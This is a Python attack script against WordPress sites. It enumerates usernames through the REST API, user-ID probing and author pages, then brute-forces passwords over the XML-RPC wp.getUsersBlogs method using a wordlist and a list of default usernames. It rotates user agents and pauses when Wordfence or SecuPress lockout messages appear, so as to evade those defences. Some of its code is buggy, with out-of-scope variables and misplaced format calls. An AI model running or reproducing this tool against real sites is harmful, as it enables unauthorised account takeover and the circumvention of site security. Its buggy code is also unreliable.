#! /usr/bin/env python
# -*- coding: utf-8 -*-
    
import requests
import argparse
import sys
import time
from fake_useragent import UserAgent
from config import PLUS, WARNING, INFO, LESS, LINE, FORBI
import json
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


words_alert = ["SecuPress", "bannie", "WebKnight", "Generated by Wordfence", "This response was generated by Wordfence", 
                "has been flagged for potential security violations", "You have exceeded the login limit", 
                "Your access to this site has been temporarily"]

class search_user:

    def search_users_id(self, url_users):
        """
        search_user_id: If /wp/v2/users is forbidden you can potentialy bypass with "users/{id}"
        """
        users_id = []
        for user_id in range(0, 100):
            url_users_id = "{}/{}".format(url_users, user_id)
            get_id = requests.get(url_users_id, verify=False)
            if get_id.status_code not in [401, 404, 403]:
                print("user potentialy found: {}".format(user_id))
                res = json.loads(get_id.text)
                if "slug" in req_users.text:
                    for slug in res:
                        users_id += slug
            else:
                pass
            sys.stdout.write("[i] search id: {}\r".format(user_id))
            sys.stdout.flush()
        if users_id:
            for ui in users_id:
                print("\t - {} User found: {}".format(PLUS, ui))
                try:
                    what_user = raw_input("{}What user do you want test ?: ".format(INFO))
                except:
                    what_user = input("{}What user do you want test ?: ".format(INFO))
                return what_user
        else:
            return False


    def search_author(self, url):
        """
        search_author: To search user with author like "website.com/?author=0"
        """
        author = []
        for author_id in range(0, 100):
            url_author = "{}?author={}".format(url, author_id)
            get_author = requests.get(url_author, verify=False)
            if get_author.status_code == 200:
                soup = BeautifulSoup(get_author.text, "html.parser")
                for link in soup.findAll('a'):
                    links = link.get('href')
                    try:
                        if "author" in links or "profile" in links:
                            l = [str(links.split('/')[-2])]
                            if str(links.split('/')[-2]) not in author and len(str(links.split('/')[-2])) > 1:
                                author += l
                        else:
                            pass
                    except:
                        pass
        if author:
            for aut in author:
                print("\n")
                print("\t - {} User found: {}".format(PLUS, aut))
            return author
                


def timer(length):
    #timer to wait securPress
    start = time.time()
    running = True
    while running:
        if time.time() - start >= length:
            running = False
        else:
            sys.stdout.write(""+ str(length - (time.time() - start)) + " secondes...\r")
            sys.stdout.flush()
    print("\n")


def page_login(url):
    """
    page_login: just check if login pages found
    """
    pages = ["wp-admin.php", "wp-login.php", "login.php", "admin"]
    for p in pages:
        res = requests.get(url.replace('xmlrpc.php', p), verify=False)
        if res.status_code == 404:
            pass
        else:
            return p


def method_allowed(url):
    """
    mthod_allowed: check if the method for bruteforce is allowed
    """
    list_method = '''<methodCall>
                    <methodName>system.listMethods</methodName>
                    <params></params>
                    </methodCall>'''
    req_method = requests.post(url, data=list_method, verify=False)
    if req_method.status_code == 405 or "Method Not Allowed" in req_method.text or "wp.getUsersBlogs" not in req_method.text:
        print("{}Method Not Allowed !").format(WARNING)
        sys.exit()
    elif req_method.status_code == 403:
        print("{}ERROR 403 - Forbidden !".format(WARNING))
        sys.exit()
    elif "wp.getUsersBlogs" in req_method.text:
        return True


def search_users(url, wordlist, user, time_sleep, u_agent, admin_page):
    """
    search_users: function to research users on the website
    #TODO research different way like "?author=1" etc...
    """
    searchUser = search_user()

    url_users = "{}wp-json/wp/v2/users".format(url)
    req_users = requests.get(url_users, verify=False)
    if req_users.status_code == 200:
        res = json.loads(req_users.text)
        if "slug" in req_users.text:
            for slug in res:
                print("\t - {} User found: {}".format(PLUS, slug["slug"]))
            try:
                what_user = raw_input("{}What user do you want test ?: ".format(INFO))
            except:
                what_user = input("{}What user do you want test ?: ".format(INFO))
            return what_user
        else:
            print("{}Nothing users found".format(LESS))
    elif req_users.status_code == 401 or req_users.status_code == 401:
        sui = searchUser.search_users_id(url_users)
        if sui:
            try:
                what_user = raw_input("{}What user do you want test ?: ".format(INFO))
            except:
                what_user = input("{}What user do you want test ?: ".format(INFO))
            return what_user
        else:
            sa = searchUser.search_author(url)
            if sa:
                try:
                    what_user = raw_input("{}What user do you want test ?: ".format(INFO))
                except:
                    what_user = input("{}What user do you want test ?: ".format(INFO))
                return what_user
            else:
                print("{}Nothing users found".format(LESS)) 
    else:
        print("{} Not found".format(LESS))


def bf_user(url, wordlist, user, time_sleep, u_agent, admin_page):
    """
    bf_user: bruteforce with basic usernames if nothing users found
    """
    print("{}Bruteforce with username: {}".format(INFO, user))
    with open(wordlist, "r+") as dico:
        dicos = dico.read().splitlines()
        for d in dicos:
            datas = '''<methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                <param><value>{}</value></param>
                <param><value>{}</value></param>
                </params>
                </methodCall>'''.format(user, d)
            try:
                req = requests.post(url, data=datas, verify=False)
            except KeyboardInterrupt as e:
                print("[-] Killing processes...")
                sys.exit(1)
            except:
                pass
            if rs:
                print(req.text)
            time.sleep(float(time_sleep))
            print(d)
            if "Incorrect" in req.text or "incorrect" in req.text:
                pass
            elif any(wa in req.text for wa in words_alert):
                print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                timer(300)
            elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
                print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
                timer(300)
            else:
                if admin_page:
                    res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
                    if any(wa in req.text for wa in words_alert):
                        print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                        timer(300)
                    else:
                        print("{}password found: {}".format(PLUS, d))
                        sys.exit()


def main(url, url_xmlrpc, wordlist, user, time_sleep, u_agent):
    if u_agent:
        user_agent = {'User-agent': u_agent}
    else:
        ua = UserAgent()
        user_agent = {'User-agent': ua.random} #for a user-agent random

    admin_page = page_login(url)
    if admin_page:
        print("{}admin page found: {}".format(PLUS, admin_page))
    #check if method allowed
    try_method = method_allowed(url_xmlrpc)
    if try_method:
        print("{}wp.getUsersBlogs function found ! \n{}Bruteforce starting...".format(PLUS,INFO))

    #if username is know
    if user:
        url = "{}xmlrpc.php".format(url)
        bf_user(url, wordlist, user, time_sleep, u_agent, admin_page)
    else:
        print("{}Search users: ".format(INFO))
        su = search_users(url, wordlist, user, time_sleep, u_agent, admin_page)
        if su:
            bf_user(url_xmlrpc, wordlist, su, time_sleep, u_agent, admin_page)
        else:
            print("{}Default users test".format(INFO))
            users = ["admin", "manager", "both", "role1", "root", "role", "tomcat", "superuser","test","administrator"]
            for u in users:
                with open(wordlist, "r+") as dico:
                    dicos = dico.read().splitlines()
                    for d in dicos:
                        datas = '''<methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                            <param><value>{}</value></param>
                            <param><value>{}</value></param>
                            </params>
                            </methodCall>'''.format(u, d)
                        try:
                            req = requests.post(url, data=datas, verify=False)
                        except KeyboardInterrupt as e:
                            print("[-] Killing processes...")
                            sys.exit(1)
                        except:
                            pass
                        time.sleep(float(time_sleep))
                        if rs:
                            print(req.text)
                        print("{}:{}".format(u, d))
                        if "Incorrect" in req.text or "incorrect" in req.text:
                            pass
                        elif any(wa in req.text for wa in words_alert):
                            timer(300)
                        elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
                            print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
                            timer(300)
                        else:
                            if admin_page:
                                res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
                                if any(wa in req.text for wa in words_alert):
                                    print("{} SecuPress actived, wait 5 min...\n".format(LESS))
                                    timer(300)
                                else:
                                    #print(res.text)
                                    print("{}password found: {}".format(PLUS, d))
                                    sys.exit()
                        

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", help="URL to scan [required]", dest='url')
    parser.add_argument("-w", help="Wordlist used for URL Fuzzing [required]", dest='wordlist')
    parser.add_argument("-s", help="timesleep if it's must fast", default=0, dest='time_sleep')
    parser.add_argument("--user", help="if you know the user", required=False, dest='user')
    parser.add_argument("-a", help="Choice user-agent", dest='user_agent', required=False)
    parser.add_argument("-rs", help="read source", dest='read_source', required=False, action='store_true')
    results = parser.parse_args()
                                     
    url = results.url
    wordlist = results.wordlist
    time_sleep = results.time_sleep
    user = results.user
    u_agent = results.user_agent
    rs = results.read_source

    if "/" not in url.split(".")[-1]:
        url = "{}/".format(url)
    else:
        pass

    url_xmlrpc = "{}xmlrpc.php".format(url)

    main(url, url_xmlrpc, wordlist, user, time_sleep, u_agent)
    
